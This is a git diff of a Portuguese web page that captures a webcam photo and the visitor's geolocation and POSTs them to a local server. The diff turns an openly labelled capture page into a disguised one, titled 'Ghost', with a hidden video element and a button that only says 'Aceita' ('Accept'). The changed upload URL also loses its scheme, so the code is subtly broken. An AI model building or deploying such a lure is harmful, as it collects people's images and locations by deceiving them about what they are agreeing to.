@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Imagem e Localização</title>
+    <title>Ghost</title>
 </head>
 <body>
-    <h1>Captura de Imagem e Localização</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <button id="capture">Capturar Imagem</button>
+    <h1>Você</h1>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <button id="capture">Aceita</button>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <p id="status"></p>
     <p id="coordinates"></p> <!-- Para exibir as coordenadas -->
@@ -18,77 +18,88 @@
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const status = document.getElementById('status');
-        const coordinates = document.getElementById('coordinates'); // Para exibir as coordenadas
+        const coordinates = document.getElementById('coordinates');
 
-        // Acessar a webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
+        let stream;
 
-                // Capturar imagem e localização
-                document.getElementById('capture').addEventListener('click', () => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
+        // Função para capturar imagem e localização
+        document.getElementById('capture').addEventListener('click', async () => {
+            if (!stream) {
+                try {
+                    // Ligar a câmera
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
+                    video.style.display = 'block';
+                } catch (err) {
+                    console.error("Erro ao acessar a webcam:", err);
+                    alert("Não foi possível acessar a webcam. Verifique as permissões do navegador.");
+                    return;
+                }
+            }
 
-                    // Obter a localização
-                    navigator.geolocation.getCurrentPosition(position => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
+            // Capturar imagem
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-                        // Enviar a imagem e a localização para o servidor
-                        fetch('http://127.0.0.1:5500/uploads', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                image: imageData,
-                                location: {
-                                    latitude: latitude,
-                                    longitude: longitude
-                                }
-                            })
-                        })
-                        .then(response => {
-                            if (!response.ok) {
-                                throw new Error(`Erro na rede: ${response.statusText}`);
-                            }
-                            return response.json();
-                        })
-                        .then(result => {
-                            console.log(result);
-                            alert(result.message);
-                            status.textContent = 'Imagem e localização enviadas com sucesso!';
-                            
-                            // Exibir as coordenadas
-                            coordinates.textContent = `Coordenadas: Latitude ${latitude}, Longitude ${longitude}`;
+            // Desligar a câmera imediatamente após a captura
+            stream.getTracks().forEach(track => track.stop());
+            video.style.display = 'none';
+            stream = null;
 
-                            // Criar e baixar o arquivo de texto
-                            const textContent = `Imagem salva com sucesso!\nCoordenadas:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-                            const blob = new Blob([textContent], { type: 'text/plain' });
-                            const url = URL.createObjectURL(blob);
-                            const a = document.createElement('a');
-                            a.href = url;
-                            a.download = 'informacoes.txt';
-                            document.body.appendChild(a);
-                            a.click();
-                            document.body.removeChild(a);
-                            URL.revokeObjectURL(url);
-                        })
-                        .catch(error => {
-                            console.error('Erro ao enviar os dados:', error);
-                            alert('Erro ao enviar os dados: ' + error.message);
-                        });
-                    }, error => {
-                        console.error("Erro ao obter localização:", error);
-                        alert("Não foi possível obter a localização. Verifique se o serviço de localização está ativado.");
-                    });
+            // Obter a localização
+            navigator.geolocation.getCurrentPosition(position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Enviar a imagem e a localização para o servidor
+                fetch('127.0.0.1:5500/uploads', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        image: imageData,
+                        location: {
+                            latitude: latitude,
+                            longitude: longitude
+                        }
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`Erro na rede: ${response.statusText}`);
+                    }
+                    return response.json();
+                })
+                .then(result => {
+                    console.log(result);
+                    alert(result.message);
+                    status.textContent = 'Imagem e localização enviadas com sucesso!';
+
+                    // Exibir as coordenadas
+                    coordinates.textContent = `Coordenadas: Latitude ${latitude}, Longitude ${longitude}`;
+
+                    // Criar e baixar o arquivo de texto
+                    const textContent = `Imagem salva com sucesso!\nCoordenadas:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+                    const blob = new Blob([textContent], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'informacoes.txt';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                })
+                .catch(error => {
+                    console.error('Erro ao enviar os dados:', error);
+                    alert('Erro ao enviar os dados: ' + error.message);
                 });
-            })
-            .catch(err => {
-                console.error("Erro ao acessar a webcam:", err);
-                alert("Não foi possível acessar a webcam. Verifique as permissões do navegador.");
+            }, error => {
+                console.error("Erro ao obter localização:", error);
+                alert("Não foi possível obter a localização. Verifique se o serviço de localização está ativado."); 
             });
+        });
     </script>
 </body>
 </html>
